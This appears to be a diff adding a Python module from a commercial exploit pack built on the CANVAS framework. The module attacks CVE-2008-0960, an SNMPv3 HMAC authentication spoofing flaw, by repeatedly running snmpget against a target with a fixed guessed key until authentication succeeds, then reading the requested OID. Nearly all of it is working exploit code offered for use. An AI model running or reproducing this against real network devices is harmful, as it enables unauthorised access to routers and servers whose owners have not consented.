@@ -1,0 +1,96 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, time, os
+from subprocess import *
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "SNMPv3 HMAC Vulnerability"
+VERSION = "0.1"
+DESCRIPTION = "SNMP Version 3 implementations HMAC authentication spoofing"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "SNMP v3"
+DOCUMENTATION["Date public"] = "2008/02/25"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/29623"
+DOCUMENTATION["CVE Name"] = "CVE-2008-0960"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0960"
+
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.host = ""
+		self.name = NAME
+		self.oid = ""
+		self.user = ""
+		self.tries = 1024
+
+		return
+	
+	def run(self):
+		self.host = self.target.interface
+		self.oid = self.argsDict.get("oid",self.oid)
+		self.user = self.argsDict.get("user",self.user)
+		self.tries = int(self.argsDict.get("tries",self.tries))
+		
+		self.setInfo("%s attacking %s"%(NAME,self.host))
+		if sys.platform in ["win32"]:
+			pf = "windows"
+		elif sys.platform in ["linux2"]:
+			pf = "linux"
+		else:
+			self.log("PLatform not supported !")
+			self.setInfo("%s attacking %s - failed"%(NAME,self.host))
+			
+		h = "%s/3rdparty/D2SEC/exploits/d2sec_snmpv3" % os.getcwd()
+		command = "\"%s/%s/snmpget.exe\" -v 3 -u %s -l authNoPriv -a MD5 -A aaaaaaaaaaaa -M \"%s/mibs\" -Lo %s %s" % (h, pf, self.user, h, self.host, self.oid)
+
+		self.log("Running %s" % command)
+
+		while self.tries > 0:
+			if sys.platform in ["win32"]:
+				p = Popen("\"%s\"" % command, shell=True, bufsize=1024, stdin=PIPE, stdout=PIPE)
+				buf = p.stdout.read()
+			else:
+				p = os.popen2(command)
+				buf = p[1].read()
+			if buf.find("failure") < 0:
+				break
+			self.tries -= 1
+
+		self.log("Finished running snmpget")
+
+		self.log(buf)
+
+		self.setInfo("%s attacking %s - finished"%(NAME,self.host))
+
+		return 0
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target -O user:<user> -O oid:<oid> -O tries:<tries>"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
